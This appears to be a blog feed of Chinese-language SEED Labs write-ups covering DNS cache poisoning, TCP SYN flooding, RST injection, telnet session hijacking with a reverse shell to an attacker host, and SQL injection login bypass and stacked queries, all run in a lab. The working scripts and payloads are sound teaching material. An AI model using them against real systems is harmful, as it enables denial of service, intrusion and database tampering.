class="attribute">prn</span>=spoof_dns)</span><br></pre></td></tr></table></figure><p><a href="http://3.xn--AttackerTask5-ij1uy85hel8nry0a.py">3.在Attacker中运行Task5.py</a>。在user中执行 dig www.example.com后，查看本地DNS的缓存。发现两条NS记录全部录入，但是Additional的三条记录只录入了一条。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411932.png" alt="image-20251214130918056"></p><p>4.结果分析</p><p>对于additional: 我们会看到以下两条记录没有被写入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Anssec2 = DNSRR(<span class="attribute">rrname</span>=<span class="string">&#x27;ns.example.net&#x27;</span>, <span class="attribute">type</span>=<span class="string">&#x27;A&#x27;</span>,ttl=259200, <span class="attribute">rdata</span>=<span class="string">&#x27;5.6.7.8&#x27;</span>) </span><br><span class="line">Anssec3 = DNSRR(<span class="attribute">rrname</span>=<span class="string">&#x27;www.facebook.com&#x27;</span>, <span class="attribute">type</span>=<span class="string">&#x27;A&#x27;</span>,ttl=259200, <span class="attribute">rdata</span>=<span class="string">&#x27;3.4.5.6&#x27;</span>)  </span><br></pre></td></tr></table></figure><p>因为当 DNS 服务器收到一个查询请求时，它通常只会关注与请求的域相关的记录，并且会忽略超出域的附加记录。这意味着超出域的附加记录不会被处理，也不会返回给查询的客户端。所以 <a href="http://www.facebook.com">www.facebook.com</a> 被丢弃了。另外对于 <a href="http://ns.example.net">ns.example.net</a> ，因为 5.6.7.8 是一个无法连接的服务器，所以被丢弃。</p><p>对于AUTHORITY SECTION： 两条信息都被存下来了。这是因为它们两个都是域相关的。同时与 Task4 进行比较，我们调整facebook在拼接的ns中的位置，进行实验。发现出现了跟Task4一样的情况。当NSsec3在第一个的时候缓存的ns只有facebook，同时additional的三条一条都没有缓存。当NSsec3在中间的时候，缓存的ns只有第一个example，另一个没有被成功缓存。只有NSsec3被放在末尾的时候才能出现我们的理想结果。并且通过wireshark抓包可以确认信息是成功发送出来了的。</p><p>注： 所以在此处我们可以对Task4做出补充，BIND 9 在处理DNS响应包的NS信息时会依次去解析，在遇到第一个处理成功NS时会跟随其域名一直处理，直到失败。并把已解析的NS存入本地缓存。</p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seed-Labs </tag>
            
            <tag> Web-Security </tag>
            
            <tag> DNS-Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Seed-Labs 2.0】TCP/IP Attack Lab</title>
      <link href="/posts/ccc8e8cb.html"/>
      <url>/posts/ccc8e8cb.html</url>
      
        <content type="html"><![CDATA[<h1>【Seed-Labs 2.0】TCP/IP Attack Lab</h1><h3 id="说在前面">说在前面</h3><p>本实验的相关文件参见官网<a href="https://seedsecuritylabs.org/Labs_20.04/Networking/TCP_Attacks/">SEED项目</a><br>本实验建议在官方提供的虚拟机环境中进行，可以参考 <a href="https://blog.csdn.net/AustinCyy/article/details/142218534">SEED-labs-ubuntu 20.04 虚拟机环境搭建_seedlabs-CSDN博客</a></p><h3 id="Lab-Environment-Setup">Lab Environment Setup</h3><p>使用docker拉取实验环境镜像。实验环境中有一台攻击者，和三台主机。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102243615.png" alt="image-20251214020940889"></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102243699.png" alt="image-20251214021041391"></p><h3 id="Task-1-SYN-Flooding-Attack">Task 1: SYN Flooding Attack</h3><p>SYN flood 是一种 DoS 攻击形式，攻击者向受害者的 TCP 端口发送许多 SYN 请求，但无意完成 3 路握手过程。攻击者要么使用欺骗的 IP 地址，要么不继续该过程。通过这种攻击，攻击者可以向受害者的队列灌水，该队列用于半开连接，即已完成 SYN、SYN-ACK 但尚未得到最终 ACK 的连接。当队列满时，受害者就无法再接受任何连接。下图展示了这种攻击。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102243787.png" alt="image-20251214021114790"></p><p>队列的大小有一个全系统范围的设置。在 Ubuntu 操作系统中，我们可以使用以下命令查看设置。操作系统会根据系统内存大小来设置该值：内存越大，该值就越大。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysctl net<span class="selector-class">.ipv4</span><span class="selector-class">.tcp_max_syn_backlog</span></span><br><span class="line">net<span class="selector-class">.ipv4</span><span class="selector-class">.tcp_max_syn_backlog</span> = <span class="number">128</span></span><br></pre></td></tr></table></figure><p>我们可以使用 netstat-nat 命令来检查队列的使用情况，即与监听端口相关的半打开连接的数量。此类连接的状态是 SYN-RECV。如果三方握手结束，则连接状态为 ESTABLISHED。</p><p>现在我们查看系统设置的排队大小范围。可以看到上限为128。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102243871.png" alt="image-20251214021243980"></p><h4 id="Task-1-1-Launching-the-Attack-Using-Python">Task 1.1: Launching the Attack Using Python</h4><p>任务内容： 使用Python实现 SYN Flooding 攻击。</p><p>1.受害主机的IP为10.9.0.5。修改 <a href="http://synflood.py">synflood.py</a> 程序如下图所示。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all import IP, TCP, send</span><br><span class="line"><span class="keyword">from</span> ipaddress import IPv4Address</span><br><span class="line"><span class="keyword">from</span> random import getrandbits</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">ip </span>= IP(<span class="attribute">dst</span>=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">tcp = TCP(<span class="attribute">dport</span>=23, <span class="attribute">flags</span>=<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">pkt = ip/tcp</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    pkt[IP].src = str(IPv4Address(getrandbits(32))) # source<span class="built_in"> iP</span></span><br><span class="line"><span class="built_in"></span>    pkt[TCP].sport = getrandbits(16) # source<span class="built_in"> port</span></span><br><span class="line"><span class="built_in"></span>    pkt[TCP].seq = getrandbits(32) # sequence number</span><br><span class="line">    send(pkt, verbose = 0)</span><br></pre></td></tr></table></figure><p>2.查看当前受害机的 tcp 连接：</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102243947.png" alt="image-20251214021710589"></p><p>3.在攻击主机上运行 <a href="http://synflood.py">synflood.py</a>，在受害主机上查看结果（结果太长截取部分）</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102244030.png" alt="image-20251214022403458"></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102244107.png" alt="image-20251214022417325"></p><p>4.我们会发现此时的所有连接都是半连接状态。此时我们尝试去连接该主机。发现只有一小会连接不上，并且之后的所有连接都是瞬间连接。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102244207.png" alt="image-20251214022633477"></p><p>5.第一次是因为，python 程序跑得不够快，其它用户总有机会抢过它。而之后能立即连接是因为，受害者主机记住了原来的连接。</p><h4 id="Task-1-2-Launch-the-Attack-Using-C">Task 1.2: Launch the Attack Using C</h4><p>任务内容： 使用C语言实现 SYN Flooding 攻击。</p><p>1.首先清除受害者主机的缓存。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip tcp_metrics flush</span><br></pre></td></tr></table></figure><p>2.运行程序查看结果，可以发现受害机的连接全部处于半连接状态。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102244295.png" alt="image-20251214023347252"></p><p>3.并且我尝试连接受害机失败。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102244380.png" alt="image-20251214023430530"></p><p>4.这是因为这个C语言程序运行的非常快，我的用户机在连接时抢不过该程序。</p><h4 id="Task-1-3-Enable-the-SYN-Cookie-Countermeasure">Task 1.3: Enable the SYN Cookie Countermeasure</h4><p>任务内容： 启用 SYN cookie 机制，并再次运行攻击，比较结果。</p><p>1.清空缓存并启用 SYN Cookie。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102244461.png" alt="image-20251214023923491"></p><p>2.再次运行 synflood，查看运行结果，可以看到队列已满，但是仍然可以连接。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102244533.png" alt="image-20251214024749575"></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102244613.png" alt="image-20251214024801106"></p><h3 id="Task-2-TCP-RST-Attacks-on-telnet-Connections">Task 2: TCP RST Attacks on telnet Connections</h3><p>TCP RST 攻击可终止两个受害者之间已建立的 TCP 连接。例如，如果两个用户 A 和 B 之间有一个已建立的 telnet 连接（TCP），攻击者可以伪造一个从 A 发送到 B 的 RST 数据包，从而破坏现有连接。要成功实施这种攻击，攻击者需要正确构建 TCP RST 数据包。</p><p>在此任务中，您需要从虚拟机发起 TCP RST 攻击，以破坏容器 A 和 B 之间现有的 telnet 连接。为了简化实验，我们假设攻击者和受害者在同一个局域网中，即攻击者可以观察到 A 和 B 之间的 TCP 流量。</p><p>请使用 Scapy 进行 TCP RST 攻击。下面提供了一段骨架代码。您需要将 @@@@ 替换为实际值（可以使用 Wireshark 获取）：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.all import *<span class="built_in"></span></span><br><span class="line"><span class="built_in">ip </span>= IP(<span class="attribute">src</span>=<span class="string">&quot;@@@@&quot;</span>, <span class="attribute">dst</span>=<span class="string">&quot;@@@@&quot;</span>)</span><br><span class="line">tcp = TCP(<span class="attribute">sport</span>=@@@@, <span class="attribute">dport</span>=@@@@, <span class="attribute">flags</span>=<span class="string">&quot;@@@@&quot;</span>, <span class="attribute">seq</span>=@@@@, <span class="attribute">ack</span>=@@@@)</span><br><span class="line">pkt = ip/tcp</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt,<span class="attribute">verbose</span>=0)</span><br></pre></td></tr></table></figure><p>选做： 自动发起攻击。编写一个程序，使用嗅探和欺骗技术自动发起攻击。与手动方法不同，我们从嗅探数据包中获取所有参数，因此整个攻击过程都是自动化的。请确保在使用 Scapy 的嗅探函数时，不要忘记设置 iface 参数。</p><p>说明：我的操作已结合选做。</p><p>1.在宿主机查看网桥的名称为 br-6ef403b7c64e</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102244693.png" alt="image-20251214025001180"></p><p>2.按照信息编写 <a href="http://tcprst.py">tcprst.py</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.all import *</span><br><span class="line"></span><br><span class="line">def spoof_pkt(pkt):</span><br><span class="line"><span class="built_in">ip </span>= IP(<span class="attribute">src</span>=pkt[IP].src, <span class="attribute">dst</span>=pkt[IP].dst)</span><br><span class="line">tcp = TCP(<span class="attribute">sport</span>=23, <span class="attribute">dport</span>=pkt[TCP].dport, <span class="attribute">flags</span>=<span class="string">&quot;R&quot;</span>, <span class="attribute">seq</span>=pkt[TCP].seq+1)</span><br><span class="line">pkt = ip/tcp</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt, <span class="attribute">verbose</span>=0)</span><br><span class="line"></span><br><span class="line">f = f<span class="string">&#x27;tcp and src host 10.9.0.5&#x27;</span></span><br><span class="line">pkt = sniff(<span class="attribute">iface</span>=<span class="string">&#x27; br-6ef403b7c64e&#x27;</span>, <span class="attribute">filter</span>=f, <span class="attribute">prn</span>=spoof_pkt)</span><br></pre></td></tr></table></figure><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102244771.png" alt="image-20251214030541786"></p><p>3.尝试连接 10.9.0.5 时显示被关闭，成功完成任务，通过伪造RST截断连接。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102244861.png" alt="image-20251214030505548"></p><h3 id="Task-3-TCP-Session-Hijacking">Task 3: TCP Session Hijacking</h3><p>TCP 会话劫持攻击的目的是通过向两个受害者之间的现有 TCP 连接（会话）注入恶意内容来劫持该会话。如果该连接是 telnet 会话，攻击者可将恶意命令（如删除重要文件）注入该会话，导致受害者执行恶意命令。下图 描述了攻击的工作原理。在本任务中，您需要演示如何劫持两台计算机之间的 telnet 会话。您的目标是让 telnet 服务器运行来自您的恶意命令。为简化任务，我们假设攻击者和受害者在同一局域网内。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102244941.png" alt="image-20251214030612269"></p><p>手动发起攻击。请使用 Scapy 进行 TCP 会话劫持攻击。下面提供了一段骨架代码。您需要用实际值替换每个 @@@@；您可以使用 Wireshark 来计算应该在欺骗的 TCP 数据包的每个字段中填入什么值。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.all import *</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">ip </span>= IP(<span class="attribute">src</span>=<span class="string">&quot;@@@@&quot;</span>, <span class="attribute">dst</span>=<span class="string">&quot;@@@@&quot;</span>)</span><br><span class="line">tcp = TCP(<span class="attribute">sport</span>=@@@@, <span class="attribute">dport</span>=@@@@, <span class="attribute">flags</span>=<span class="string">&quot;@@@@&quot;</span>, <span class="attribute">seq</span>=@@@@, <span class="attribute">ack</span>=@@@@)</span><br><span class="line">data = <span class="string">&quot;@@@@&quot;</span></span><br><span class="line">pkt = ip/tcp/data</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt,<span class="attribute">verbose</span>=0)</span><br></pre></td></tr></table></figure><p>选做： 自动发起攻击。编写一个程序，使用嗅探和欺骗技术自动发起攻击。与手动方法不同，我们从嗅探数据包中获取所有参数，因此整个攻击过程都是自动化的。请确保在使用 Scapy 的嗅探函数时，不要忘记设置 iface 参数。</p><p>说明：我的操作已结合选做。</p><p><a href="http://1.xn--tcphijacking-3y7sr6ybobc1ep9bn8gx1c3zj786c6pas77guqiwy6i6fta6p3assbf05bmy7bdyycmdc.py">1.编写并运行结合嗅探和伪造的自动化攻击程序tcphijacking.py</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.all import *</span><br><span class="line"></span><br><span class="line">def spoof_pkt(pkt):</span><br><span class="line"><span class="built_in">ip </span>= IP(<span class="attribute">src</span>=pkt[IP].dst, <span class="attribute">dst</span>=pkt[IP].src)</span><br><span class="line">tcp = TCP(<span class="attribute">sport</span>=pkt[TCP].dport, <span class="attribute">dport</span>=23,</span><br><span class="line">              <span class="attribute">flags</span>=<span class="string">&quot;A&quot;</span>,</span><br><span class="line">              <span class="attribute">seq</span>=pkt[TCP].ack, <span class="attribute">ack</span>=pkt[TCP].seq+1)</span><br><span class="line">data = <span class="string">&quot;echo \&quot;ლ(́◕◞౪◟◕‵ლ)\&quot; &gt;&gt; ~/hijacking.out\n\0&quot;</span></span><br><span class="line">pkt = ip/tcp/data</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt, <span class="attribute">verbose</span>=0)</span><br><span class="line"></span><br><span class="line">f = f<span class="string">&#x27;tcp and src host 10.9.0.5&#x27;</span></span><br><span class="line">pkt = sniff(<span class="attribute">iface</span>=<span class="string">&#x27;br-6ef403b7c64e&#x27;</span>, <span class="attribute">filter</span>=f, <span class="attribute">prn</span>=spoof_pkt)</span><br></pre></td></tr></table></figure><p>2.可以看到 10.9.0.5 受害机上被成功写入我们的文件，攻击成功。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102245036.png" alt="image-20251214030823135"></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102245130.png" alt="image-20251214031814749"></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102245214.png" alt="image-20251214032008998"></p><h3 id="Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking">Task 4: Creating Reverse Shell using TCP Session Hijacking</h3><p>当攻击者利用 TCP 会话劫持向受害者机器注入命令时，他们并不希望在受害者机器上运行一个简单的命令，而是希望运行许多命令。显然，通过 TCP 会话劫持来运行这些命令是不方便的。攻击者想要达到的目的是利用攻击设置后门，这样他们就可以利用这个后门方便地进行进一步破坏。</p><p>设置后门的一种非典型方法是从受害者机器上运行一个反向 shell，让攻击者通过 shell 访问受害者机器。反向 shell 是在远程机器上运行的 shell 进程，可连接回攻击者的机器。一旦远程机器被入侵，攻击者就可以方便地访问远程机器。在本任务中，学生需要证明他们能够实现这一目标。</p><p>1.编写 <a href="http://reverseshell.py">reverseshell.py</a>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">在这里插入代码片#!/usr/bin/env python3</span><br><span class="line"><span class="keyword">from</span> scapy.all import *</span><br><span class="line"></span><br><span class="line">def spoof_pkt(pkt):</span><br><span class="line">   <span class="built_in"> ip </span>= IP(<span class="attribute">src</span>=pkt[IP].dst, <span class="attribute">dst</span>=pkt[IP].src)</span><br><span class="line">    tcp = TCP(<span class="attribute">sport</span>=pkt[TCP].dport, <span class="attribute">dport</span>=23, <span class="attribute">flags</span>=<span class="string">&quot;A&quot;</span>, <span class="attribute">seq</span>=pkt[TCP].ack, <span class="attribute">ack</span>=pkt[TCP].seq + 1)</span><br><span class="line">    </span><br><span class="line">    # 构造反向 Shell 命令，该命令将通过 TCP 与攻击者的机器建立连接（10.9.0.1:9090）</span><br><span class="line">    # 启动一个 Bash shell 并将其输入输出重定向到指定的端口，从而允许攻击者远程控制目标机器</span><br><span class="line">    data = <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1\n\0&quot;</span> </span><br><span class="line">    pkt =<span class="built_in"> ip </span>/ tcp / data</span><br><span class="line">    </span><br><span class="line">    send(pkt, <span class="attribute">verbose</span>=0)</span><br><span class="line"></span><br><span class="line">f = <span class="string">&#x27;tcp and src host 10.9.0.5&#x27;</span></span><br><span class="line">pkt = sniff(<span class="attribute">iface</span>=<span class="string">&#x27;br-6ef403b7c64e&#x27;</span>, <span class="attribute">filter</span>=f, <span class="attribute">prn</span>=spoof_pkt)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>2.在 attacker主机上开启监听：</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214102245287.png" alt="image-20251214034909354"></p><p>3.使用telnet 连接 10.9.0.5 受害者主机，并在attacker上运行 <a href="http://reverseshell.py">reverseshell.py</a>，可以看到运行结果，成功拿到 victim 的 shell：</p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seed-Labs </tag>
            
            <tag> Network-Security </tag>
            
            <tag> TCP-IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Seed-Labs 2.0】SQL Injection Attack Lab</title>
      <link href="/posts/d33c94e.html"/>
      <url>/posts/d33c94e.html</url>
      
        <content type="html"><![CDATA[<h1>【Seed-Labs 2.0】SQL Injection Attack Lab</h1><h3 id="Overview">Overview</h3><p>SQL 注入是一种代码注入技术，利用的是网络应用程序与数据库服务器之间接口的漏洞。当用户输入的信息在发送到后端数据库服务器之前没有在网络应用程序中进行正确检查时，就会出现这种漏洞。</p><p>许多网络应用程序从用户那里获取输入，然后使用这些输入构建 SQL 查询，以便从数据库中获取信息。网络应用程序还使用 SQL 查询将信息存储到数据库中。这些都是开发网络应用程序的常见做法。如果不仔细构造 SQL 查询，就会出现 SQL 注入漏洞。SQL 注入是对网络应用程序最常见的攻击之一。</p><p>在本实验室中，我们创建了一个易受 SQL 注入攻击的网络应用程序。我们的网络应用程序包含许多网络开发人员常犯的错误。学生的目标是找到利用 SQL 注入漏洞的方法，演示攻击可能造成的破坏，并掌握有助于防御此类攻击的技术。本实验涵盖以下主题：</p><ul><li><p>SQL 语句： SELECT 和 UPDATE 语句</p></li><li><p>SQL 注入</p></li><li><p>预编译语句（Prepared statement）</p></li></ul><h3 id="LabEnvironment">LabEnvironment.</h3><ul><li><p>虚拟机环境：SEED-labs-ubuntu 20.04</p></li><li><p>使用软件：Oracle VM VirtualBox7.1.0</p></li></ul><h3 id="LabEnvironment-Setup">LabEnvironment Setup</h3><p>说在前面：<br>在开始之前请确认自己的实验环境中是否有其他的docker镜像或是mysql数据库。有的话建议先删除再开始实验。</p><p>1.DNS 定向确认。打开 /etc/hosts 查看是否建立正确的映射。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230150683.png" alt="image-20251209170558677"></p><p>2.使用docker建立网络环境。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230150866.png" alt="image-20251209170710796"></p><p>3.查看docker的id。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230150775.png" alt="image-20251209171018053"></p><p>4.启动网络服务。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230150936.png" alt="image-20251209171041174"></p><p>5.启动过程中发现有报错，随即打开对应的网站，发现是默认网页。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230150991.png" alt="image-20251209171741154"></p><p>这个报错的解决方案参考satckoverflow的帖子得出：<br>apache - Getting message AH00558: apache2: - Stack Overflow<br>注： 这个错误消息表示 Apache HTTP 服务器无法确定其完全合格域名（FQDN）。要解决这个问题并消除警告，我们需要在apache的配置文件中写清楚我们的 ServerName 为 10.9.0.5。</p><p>6.修改 image_www/apache_sql_injection.conf 将ServerName 换成已建立DNS定向映射的网站后保存。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">        <span class="attribute">DocumentRoot</span> /var/www/SQL_Injection</span><br><span class="line">        <span class="attribute">ServerName</span>   www.SeedLabSQLInjection.com</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>7.进入docker后找到apache2的配置文件 etc/apache2/apache2.conf，在文件的最后加上我们使用的 10.9.0.5。</p><p>8.全部保存后，成功打开网页。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230151045.png" alt="image-20251210103222739"></p><h3 id="Task-1-Get-Familiar-with-SQL-Statements">Task 1: Get Familiar with SQL Statements</h3><p><strong>Part1:熟悉mysql的基本操作.</strong></p><p>1.进入装载mysql的docker，然后登录root账号，进入mysql client。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230153182.png" alt="image-20251210103637903"></p><p>2.加载已存在的 sqllab_users 数据库，并查看该数据库中的表。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230154486.png" alt="image-20251210103833925"></p><p><strong>Part2:使用SQL命令打印Alice的所有信息。</strong></p><p>1.使用SQL语句打印 Alice的所有信息。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> credential <span class="keyword">WHERE</span> <span class="type">Name</span>=’Alice’;</span><br></pre></td></tr></table></figure><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230155539.png" alt="image-20251210104036852"></p><h3 id="Task-2-SQLInjection-Attack-on-SELECT-Statement">Task 2: SQLInjection Attack on SELECT Statement</h3><h4 id="Task-2-1-SQL-Injection-Attack-from-webpage">Task 2.1: SQL Injection Attack from webpage.</h4><p>任务： 在不知道admin的密码的情况下，登录进该账号并查看。</p><p>1.因为我们只知道账号 admin，因此在username的输入上思考，查看原始代码，注意到逻辑的登录逻辑是同时对账号和密码在数据库中进行匹配。我们应该想办法通过输入username来忽略输入密码的部分。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">WHERE</span> name= <span class="string">&#x27;<span class="variable">$input_uname</span>&#x27;</span> and Password=<span class="string">&#x27;<span class="variable">$hashed_Pwd</span>&#x27;</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><p>2.“忽略”的实现可以通过注释掉后面输入密码的部分来实现，因此尝试输入admin’#，以构造目标结构，结构如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE <span class="attribute">name</span>=<span class="string">&#x27;admin&#x27;</span># <span class="string">&#x27; and Password=&#x27;</span><span class="variable">$hased_pwd</span><span class="string">&#x27;&quot;;</span></span><br></pre></td></tr></table></figure><p>3.尝试输入 admin’#。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230156525.png" alt="image-20251210104534980"></p><p>4.成功登录，能够查看到所有的数据。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230157452.png" alt="image-20251210104647241"></p><h4 id="Task-2-2-SQL-Injection-Attack-from-command-line">Task 2.2: SQL Injection Attack from command line.</h4><p>任务： 不使用web页面，只用shell界面进行2.1任务。</p><p>1.参考题目提供代码，使用shell发送请求，成功获得返回值。为方便阅读将结果保存下来，这样可以更清晰的看见结果。</p><p>注：题目上提到要将所有的符号进行编码，#的编码形式为%23。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230158506.png" alt="image-20251210105156231"></p><h4 id="Task-2-3-Append-a-new-SQL-statement">Task 2.3: Append a new SQL statement.</h4><p>任务 一次执行两个sql语句实现对数据库的内容进行更改。</p><p>1.输入</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;; <span class="keyword">UPDATE</span> credential <span class="keyword">SET</span> Name=<span class="string">&#x27;Austin&#x27;</span> <span class="keyword">WHERE</span> ID = <span class="string">&#x27;1&#x27;</span>;#</span><br></pre></td></tr></table></figure><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230159504.png" alt="image-20251210105530789"></p><p>2.发现无法成功达成预期效果，观察题目提供的原始代码，可知程序使用的是query() 函数运行我们输入的sql语句， 然而PHP 中 mysqli 扩展的 query（） 函数不允许在数据库服务器中运行多条语句，所以我们会执行失败，这也是本网站的针对sql注入攻击的一种countermeasure。</p><p>3.为解决该问题，最直接的方法就是不使用 query() 函数，换成能够执行多条语句的函数。进入docker，找到var/www/SQL_Injection/目录下的unsafe_home.php，在其中更改 query() 函数为 multi_query() 函数（共有两处）。</p><p>4.保存更改后，重新使用之前的语句进行攻击，可以看到成功执行输入的两条sql语句，数据库的内容成功被篡改。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入的语句：admin&#x27;; <span class="keyword">UPDATE</span> credential <span class="keyword">SET</span> Name=<span class="string">&#x27;Austin&#x27;</span> <span class="keyword">WHERE</span> ID = <span class="string">&#x27;1&#x27;</span>;#</span><br><span class="line">欲实现将 `Name`=’Alice’的行的’Alice’改为’Austin’</span><br></pre></td></tr></table></figure><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230200520.png" alt="image-20251210111351241"></p><p>注：此处应在mysql中直接查看credential数据库的值，因为query()和multi_query()的函数返回值不同，所以执行新的语句后，不会有信息显示在webpage上。</p><h3 